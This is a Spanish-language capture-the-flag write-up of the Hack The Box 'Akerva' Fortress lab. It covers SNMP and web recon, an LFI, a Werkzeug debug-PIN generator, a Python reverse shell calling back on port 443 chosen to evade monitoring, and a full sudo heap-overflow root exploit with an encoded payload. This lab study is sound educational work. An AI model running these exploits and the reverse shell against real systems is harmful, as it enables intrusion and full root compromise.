---
layout: single
title: Akerva - Hack The Box
excerpt: "Akerva es una máquina de la sección Fortress de Hack The Box."
date: 2022-08-12
classes: wide
header:
  teaser: /assets/images/htb_writeup_akerva/akerva.PNG
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - HTB
  - TCP
  - UDP
  - WordPress
---

![](/assets/images/htb_writeup_akerva/akerva2.png)
Akerva es una máquina de la sección Fortress de Hack The Box en la que se pueden hackear un montón de cosas, así podemos practicar un montón de técnicas distintas en la misma máquina.

## PORT SCAN

TCP:

```
> nmap -sV -sC -Pn -n -T5 10.13.37.11 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-11 21:09 CEST
Nmap scan report for 10.13.37.11
Host is up (0.11s latency).
Not shown: 925 closed tcp ports (conn-refused), 72 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.4-alpha-47225
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
|_http-server-header: Apache/2.4.29 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-auth: 
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.05 seconds
```

Podemos ver que el `puerto 22` está abierto, es decir `ssh`, aunque eso es normal en estas máquinas, ya que en muchas lo podemos utilizar si tenemos alguna `credencial` o `ssh key`, para establecer conexión con esa máquina desde ese puerto.

Por otra parte, también vemos el `puerto 80` por lo que podemos suponer que tiene una página `web`.

Y también el `5000 http`, es decir, otro servicio `web`, pero en este vemos un que tiene una cosita bastante interesante que es `Werkzeug`, así que es algo que tenemos que tener en cuenta luego al ver a fondo ese puerto, ya que esa versión puede tener alguna vulnerabilidad.

También `nmap` ya nos dice que es una máquina Linux, pero por si acaso vamos a mandarle una `traza ICMP` para mediante el `ttl: time to live` poder saber cuál es el sistema operativo `OS` con más exactitud.

```
> ping -c 1 10.13.37.11

PING 10.13.37.11 (10.13.37.11) 56(84) bytes of data.
64 bytes from 10.13.37.11: icmp_seq=1 ttl=63 time=106 ms

--- 10.13.37.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.970/105.970/105.970/0.000 ms
```

Vemos que el ttl = 63 aunque en la realidad es `ttl = 64` porque la conexión no es directa, sino que pasa por un host intermediario, lo cual le quita uno de ttl. Por lo que podemos saber que estamos ante una máquina `Linux`.

UDP:

```
❯ sudo nmap -sU --open -T5 --top-ports 200 10.13.37.11
Nmap scan report for 10.13.37.11
PORT      STATE         SERVICE
161/udp   open          snmp
```

Con `snmpbulkwalk` podemos ver la informacion que haya en ese puerto, y en este caso nos da una FLAG: `AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}`

```
❯ snmpbulkwalk -v2c -c public 10.13.37.11 | grep AKERVA

iso.3.6.1.2.1.25.4.2.1.5.1243 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
```

## PUERTO 80

Si vamos a su sitio web veremos esto:

![](/assets/images/htb_writeup_akerva/web-80.PNG)

En un principio puede parecer que no hay gran cosa, pero si nos fijamos en la parte de abajo de la web tenemos una información muy útil. El gestor de contenido de la web es `WordPress` y si miramos con `Wappalizer` veremos lo mismo, es decir que ya sabemos por donde tirar.

También es verdad que en la izquierda podemos ver unos nombres que quizás más adelante pudrían ser usuarios válidos, pero de momento no nos son de utilidad.

Antes de empezar a hacer pruebas voy a mirar el código, aver si hay algún subdominio/directorio/... interesante y ya de paso a ver si hay alguna flag. Y resulta que no hay nada interesante, pero nos encontramos otra FLAG: `AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}`

![](/assets/images/htb_writeup_akerva/flag-1.PNG)

Ahora ya podemos empezar a hacer `reconocimiento` de la web a ver si encontramos algo interesante.

Para empezar podemos mirar con `Wappalizer` y ahí encontramos un par de cosas interesantes:

![](/assets/images/htb_writeup_akerva/wappalizer.PNG)

Podemos ver que hay una base de datos, `MySQL` y sabiendo que el gestor es un `Wordpress`, pues huele mucho a que en algún punto es vulnerable a `SQL injection`. Ya que los Worpress son muy propensos a tener esa clase de vulnerabilidades.

También podemos ver que tiene `JQuery`, pero no es de una versión vulnerable a `Prototype Pollution`, ya que el último artículo que hice fue sobre eso y me hacía ilusión XD, pero por si acaso voy a mirar a ver si es vulnerable a otras cosas. No, no parece tener ninguna vulnerabilidad asociada a esas versiones.

También podemos probar con `Whatweb` a ver si vemos algo interesante:

```
> whatweb http://10.13.37.11/

http://10.13.37.11/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.13.37.11], JQuery, MetaGenerator[WordPress 5.4-alpha-47225], PoweredBy[@lydericlefebvre,WordPress], Script, Title[Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr], UncommonHeaders[link], WordPress, x-pingback[http://10.13.37.11/xmlrpc.php]
```

Pero no nos dice nada que no supiesemos :(

Pues vamos a intentar encontrar directorios con `Wfuzz`:

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.13.37.11/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000241:   301        9 L      28 W       315 Ch      "wp-content"                                                                                                                
000000274:   401        14 L     54 W       458 Ch      "scripts"                                                                                                                                                                                                                                    
000000786:   301        9 L      28 W       316 Ch      "wp-includes"                                                                                                               
000000834:   301        9 L      28 W       308 Ch      "dev"                                                                                                                       
000001073:   301        9 L      28 W       315 Ch      "javascript"                                                                                                                
000007180:   301        9 L      28 W       313 Ch      "wp-admin"                                                                                                                  
000011260:   301        9 L      28 W       312 Ch      "backups"                                                                                                                   
000095524:   403        9 L      28 W       276 Ch      "server-status"       
```

Archivos .php :

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.13.37.11/FUZZ.php

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================
                                                                                     
000000475:   200        86 L     308 W      5036 Ch     "wp-login"                                                                                                                  
000000015:   301        0 L      0 W        0 Ch        "index"                                                                                                                                                  
000005002:   200        4 L      15 W       135 Ch      "wp-trackback"                                                                                                              
000017049:   405        0 L      6 W        42 Ch       "xmlrpc"                                                                                                               
000046026:   302        0 L      0 W        0 Ch        "wp-signup"                                                                                       
```

He probado con un `Idor` en el directorio `/wp-admin`, ya que hacía un `redirect al login` y ha funcionado, he `bypasseado el login`, pero la página estaba en blanco, es muy raro, supongo que no irán por ahí los tiros. Así que no merece la pena explicar ahora esa vulnerabilidad, ya que me da un poco pereza y total, ya la explicaré en otro momento.

En el puerto que estaba por `UDP` hemos visto un directorio interesante: `/var/www/html/scripts/backup_every_17minutes.sh`. Solo se puede acceder a el por `POST`.

```
❯ curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh

#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
# AKERVA{IKNoW###VeRbTamper!nG_==}

SAVE_DIR=/var/www/html/backups

while true
do
         ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
         echo "Erasing old backups..."
         rm -rf $SAVE_DIR/*

         echo "Backuping..."
         zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

         echo "Done..."
         sleep 1020
done
```
Y ahí hay otra FLAG: `AKERVA{IKNoW###VeRbTamper!nG_==}`

Siguiendo con los `scripts vulnerables` antes también hemos visto un script que si lo analizamos `crea un .zip` comprimiendo `cada 1020 segundos` todo lo que está en `/var/www/html en /var/www/html/backups` con el nombre iniciando con backup_ seguido del año, mes, día, hora, minuto y segundo en el que se creó.

Podemos conseguir algo parecido al ver la parte de `Date` en la respuesta al hacerle un `curl`.

```
❯ curl -I 10.13.37.11 | grep Date
Date: Sat, 12 Aug 2022 14:16:27 GMT
```

Con esa información ya podemos empezar a saber el nombre del archivo.zip: `backup_2022081314****.zip`. **** son los minutos y segundos, porque es probable que sean diferentes a cuando se hizo el backup. Pero no hay problema ya que el resto lo podemos conseguir a `fuerza bruta` con `wfuzz`:

```
❯ wfuzz -c -u http://10.13.37.11/backups/backup_2022061001FUZZ.zip -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt --hc 404

Target: http://10.13.37.11/backups/backup_2022061001FUZZ.zip
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000227:   200        9 L      42 W       493 Ch      "1454"
```

Una vez conociendo estos números ya podemos completar el nombre del archivo, y con hacer un `wget` a ese archivo ya podremos conseguir él .zip.

```
> wget http://10.13.37.11/backups/backup_20220813141454.zip
Grabando a: «backup_20220813141454.zip»

backup_20220813141454.zip      100%[=================================>]  21.05M
```

Y ya tendríamos el archivo.

Al descomprimirlo podremos ver un archivo en var/www/html/dev/ que tiene la FLAG: `AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`

```
var/www/html/dev ❯ cat space_dev.py

#!/usr/bin/python

from flask import Flask, request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
        "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
        }

@auth.verify_password
def verify_password(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False

@app.route('/')
@auth.login_required
def hello_world():
    return 'Hello, World!'

# TODO
@app.route('/download')
@auth.login_required
def download():
    return downloaded_file

@app.route("/file")
@auth.login_required
def file():
	filename = request.args.get('filename')
	try:
		with open(filename, 'r') as f:
			return f.read()
	except:
		return 'error'

if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)
```


## PUERTO 5000

Al intentar ir a la web de este puerto nos pide un `user` y una `password`:

![](/assets/images/htb_writeup_akerva/web5000-1.PNG)

Si nos fijamos en el script que hemos visto antes podemos ver que para el puerto 5000 el user es `aas` y la password es `AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`. Así que las ponemos y nos deja entrar, aunque a primera vista no vemos nada interesante.

![](/assets/images/htb_writeup_akerva/web5000-2.PNG)

También si nos damos cuenta, en el script podemos ver una función que podría llegar a provocar un `LFI` con /file y el `gruapper` filename:

![](/assets/images/htb_writeup_akerva/web5000-3.PNG)

Podemos ver que hay dos usuarios: `root` y `aas`. Y ya que nos hemos logueado como aas podemos probar a hacer un lfi a ver si conseguimos ver su FLAG: `AKERVA{IKNOW#LFi_@_}`

![](/assets/images/htb_writeup_akerva/web5000-4.PNG)

Ahora si buscamso posibles directorios con `Wfuzz` encontraremos el directorio `console`:

```
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.13.37.11:5000/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11:5000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000003644:   200        52 L     186 W      1985 Ch     "console"         
```

Si vamos a ese directorio nos encontramos con que está bloqueado por un `PIN`. 

En la fase de reconocimiento hemos visto que el puerto 5000 tenía `Werkzeug` y en `hacktricks` hay un `exploit` para esa versión. Si a ese exploit le cambiamos un par de cosas y lo ejecutamos, nos debería dar un pin válido.

Primero cambiaremos el user a `aas`.

Luego cambiaremos la `versión de Python`:

```
'/usr/local/lib/python2.7/dist-packages/flask/app.pyc', # getattr(mod, '__file__', None),
```

Ahora cambiaremos la linea en `private bites`, este valor es dinámico, pero con hacer un lfi al directorio `/sys/class/net/ens33/address` ya lo tendríamos:

```
'005056b954b5', # str(uuid.getnode()),  /sys/class/net/ens33/address
```

El siguiente también es dinámico, pero con otro lfi a `/etc/machine-id` también lo tendríamos:

```
'258f132cd7e647caaf5510e3aca997c1', # get_machine_id(), /etc/machine-id
```

En mi caso el script quedaría asi, pero en tu caso tienes que cambiar los últimos dos valores a los tuyos, ya que son dinámicos:

```
import hashlib
from itertools import chain
probably_public_bits = [
    'aas', # username
    'flask.app', # modname
    'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
    '005056b954b5', # str(uuid.getnode()),  /sys/class/net/ens33/address
    '258f132cd7e647caaf5510e3aca997c1', # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

Ahora lo ejecutamos y ya nos debería dar un PIN valido:

```
❯ python3 exploit.py
228-027-395
```

Y con este PIN logramos acceder a /console.

Básicamente es una consola de Python, por lo que podemos mandaros una `reverse shell` utilizando `Python`, pero antes de esto tenemos que `poner el puerto 443 a la escucha con netcta` (ponemos el puerto 443, ya que en servidores web suele ser un puerto utilizado para `https` y, por lo tanto, al trasmitir información por ese puerto es más difícil que nos detecten, porque los programas de monitorización automatizados no suelen tener en cuenta la información que se tramita por ese puerto, ya que es normal que se tramite información por ese puerto):

```
[console ready]
>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.14.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

Ahora si miramos con un `ls` no veremos una flag nueva, solo la que ya habíamos visto, pero con un `ls -a` sí que la podremos ver, ya que estaba oculta. FLAG: `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`

```
aas@Leakage:~$ ls -a
. ..  .bash_history .bash_logout .bashrc flag.txt .hiddenflag.txt .ssh

aas@Leakage:~$ cat .hiddenflag.txt
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
```

## ESCALADA DE PRIVILEGIOS

Entre las muchas cosas que he probado he encontrado esto:

```
aas@Leakage:/tmp$ sudo --version
Sudo version 1.8.21p2
```

Vemos que la `vesión de sudo es antigua`, entonces podríamos intetar explotar eso para tener una `shell` de `root`.

Para eso he encontrado este `exploit`:

```
import os,subprocess,sys
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

print(" [\033[1;32m+\033[1;37m] Iniciando el exploit ")

SUDO_PATH = b"/usr/bin/sudo"

libc = cdll.LoadLibrary("libc.so.6")

LC_CATS = [
	b"LC_CTYPE", b"LC_NUMERIC", b"LC_TIME", b"LC_COLLATE", b"LC_MONETARY",
	b"LC_MESSAGES", b"LC_ALL", b"LC_PAPER", b"LC_NAME", b"LC_ADDRESS",
	b"LC_TELEPHONE", b"LC_MEASUREMENT", b"LC_IDENTIFICATION"
]

def check_is_vuln():

	r, w = os.pipe()
	pid = os.fork()
	if not pid:

		os.dup2(w, 2)
		execve(SUDO_PATH, [ b"sudoedit", b"-s", b"-A", b"/aa", None ], [ None ])
		exit(0)

	os.close(w)
	os.waitpid(pid, 0)
	r = os.fdopen(r, 'r')
	err = r.read()
	r.close()

	if "sudoedit: no askpass program specified, try setting SUDO_ASKPASS" in err:
		return True
	assert err.startswith('usage: ') or "invalid mode flags " in err, err
	return False

def create_libx(name):
	so_path = 'libnss_'+name+'.so.2'
	if os.path.isfile(so_path):
		return

	so_dir = 'libnss_' + name.split('/')[0]
	if not os.path.exists(so_dir):
		os.makedirs(so_dir)

	import zlib
	import base64

	libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
	with open(so_path, 'wb') as f:
		f.write(zlib.decompress(base64.b64decode(libx_b64)))

def check_nscd_condition():
	if not os.path.exists('/var/run/nscd/socket'):
		return True

	import socket

	sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
	try:
		sk.connect('/var/run/nscd/socket')
	except:
		return True
	else:
		sk.close()

	with open('/etc/nscd.conf', 'r') as f:
		for line in f:
			line = line.strip()
			if not line.startswith('enable-cache'):
				continue
			service, enable = line.split()[1:]

			if service == 'passwd' and enable == 'yes':
				return False

			if service == 'group' and enable == 'yes':
				return False

	return True

def get_libc_version():
	output = subprocess.check_output(['ldd', '--version'], universal_newlines=True)
	for line in output.split('\n'):
		if line.startswith('ldd '):
			ver_txt = line.rsplit(' ', 1)[1]
			return list(map(int, ver_txt.split('.')))
	return None

def check_libc_version():
	version = get_libc_version()
	assert version, "Cannot detect libc version"

	return version[0] >= 2 and version[1] >= 26

def check_libc_tcache():
	libc.malloc.argtypes = (c_int,)
	libc.malloc.restype = c_void_p
	libc.free.argtypes = (c_void_p,)

	size1, size2 = 0xd0, 0xc0
	mems = [0]*32

	for i in range(len(mems)):
		mems[i] = libc.malloc(size2)

	mem1 = libc.malloc(size1)
	libc.free(mem1)
	mem2 = libc.malloc(size2)
	libc.free(mem2)
	for addr in mems:
		libc.free(addr)
	return mem1 != mem2

def get_service_user_idx():

	idx = 0
	found = False
	with open('/etc/nsswitch.conf', 'r') as f:
		for line in f:
			if line.startswith('#'):
				continue
			line = line.strip()
			if not line:
				continue
			words = line.split()
			if words[0] == 'group:':
				found = True
				break
			for word in words[1:]:
				if word[0] != '[':
					idx += 1

	assert found, ' [\033[1;31m!\033[1;37m] No se encuentra la base de datos "grupo" '
	return idx

def get_extra_chunk_count(target_chunk_size):

	chunk_cnt = 0

	gids = os.getgroups()
	malloc_size = len("groups=") + len(gids) * 11
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1

	import socket
	malloc_size = len("host=") + len(socket.gethostname()) + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1

	try:
		import ipaddress
	except:
		return chunk_cnt
	cnt = 0
	malloc_size = 0
	proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
	for line in proc.stdout:
		line = line.strip()
		if not line.startswith('inet'):
			continue
		if cnt < 2:
			cnt += 1
			continue;
		addr = line.split(' ', 2)[1]
		mask = str(ipaddress.ip_network(addr if sys.version_info >= (3,0,0) else addr.decode("UTF-8"), False).netmask)
		malloc_size += addr.index('/') + 1 + len(mask)
		cnt += 1
	malloc_size += len("network_addrs=") + cnt - 3 + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1
	proc.wait()

	return chunk_cnt

def execve(filename, argv, envp):
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)

	libc.execve(filename, cargv, cenvp)

def lc_env(cat_id, chunk_len):
	name = b"C.UTF-8@"
	name = name.ljust(chunk_len - 0x18, b'Z')
	return LC_CATS[cat_id]+b"="+name

try:
    assert check_is_vuln(), " [\033[1;31m!\033[1;37m] La versión de sudo no es vulnerable'"
except:
    print(" [\033[1;31m!\033[1;37m] La versión de sudo no es vulnerable " )
    sys.exit()

try:
    assert check_libc_version(), " [!] La versión de glibc es demasiado antigua "
except:
    print(" [\033[1;31m!\033[1;37m] La versión de glibc es demasiado antigua ")
    sys.exit()

try:
    assert check_libc_tcache(), " [\033[1;31m!\033[1;37m] No se encontró el paquete glibc "
except:
    print(" [\033[1;31m!\033[1;37m] No se encontró el paquete glibc ")
    sys.exit()

try:
    assert check_nscd_condition(), " [\033[1;31m!\033[1;37m] El servicio nscd se está ejecutando "
except:
    print(" [\033[1;31m!\033[1;37m] El servicio nscd se está ejecutando ")

service_user_idx = get_service_user_idx()
assert service_user_idx < 9, '"group" db in nsswitch.conf is too far, idx: %d' % service_user_idx
create_libx("X/X1234")

FAKE_USER_SERVICE_PART = [ b"\\" ] * 0x18 + [ b"X/X1234\\" ]

TARGET_OFFSET_START = 0x780
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*30
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]

CHUNK_CMND_SIZE = 0xf0

extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) < 2 else int(sys.argv[1])

argv = [ b"sudoedit", b"-A", b"-s", b"A"*(CHUNK_CMND_SIZE-0x10)+b"\\", None ]
env = [ b"Z"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b"\\" ] + FAKE_USER_SERVICE
env.extend([ lc_env(0, 0x40)+b";A=", lc_env(1, CHUNK_CMND_SIZE) ])

for i in range(2, service_user_idx+2):
	env.append(lc_env(i if i < 6 else i+1, 0x40))
if service_user_idx == 0:
	env.append(lc_env(2, 0x20))

for i in range(11, 11-extra_chunk_cnt, -1):
	env.append(lc_env(i, CHUNK_CMND_SIZE))

env.append(lc_env(12, 0x90))
env.append(b"TZ=:")
env.append(None)

print(' [\033[1;32m+\033[1;37m] Exploit completado ')

execve(SUDO_PATH, argv, env)
```

Lo ejecutamos y nos convierte en el usuario `root`:

FLAG: `AKERVA{IkNow_Sud0_sUckS!}`

```
aas@Leakage:/tmp$ python3 exploit.py
 [+] Iniciando el exploit 
 [+] Exploit completado 
# whoami
root
# cat /root/flag.txt
AKERVA{IkNow_Sud0_sUckS!}
```


## FLAG EXTRA: Cryptografia

En el directorio `/root` también nos encontramos el archivo `secured_note.md` que contiene una cadena encriptada en `base64`. La decodeamos pero sigue encriptada:

```
root@Leakage:~# cat secured_note.md 
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
U1BNSUhITU9EQVVLSEUK

@AKERVA_FR | @lydericlefebvre
root@Leakage:~# echo "R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK" | base64 -d
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```

Por lo que vamos a utilizar vigenere-cipher para decodear lo que nos queda.

Para eso tenemos que introducir la infomación que ya sabemos:

-No tenemo las letras `B,J,Q,X,Z` por lo que nuestro alphabet se reduce a `ACDEFGHIKLMNOPRSTUVWY`

-Conocemos el principio de la flag: `AKERVA`


Entonces introducimos esa información y le damos a `decrypt`:

![](/assets/images/htb_writeup_akerva/Cryto1.png)

![](/assets/images/htb_writeup_akerva/Crypto2.png)

Ahora en el final de esa cadena de texto podemos ver la FLAG: `AKERVA{IKNOOOWVIGEEENERRRE}`

![](/assets/images/htb_writeup_akerva/uwu.PNG)

uwu
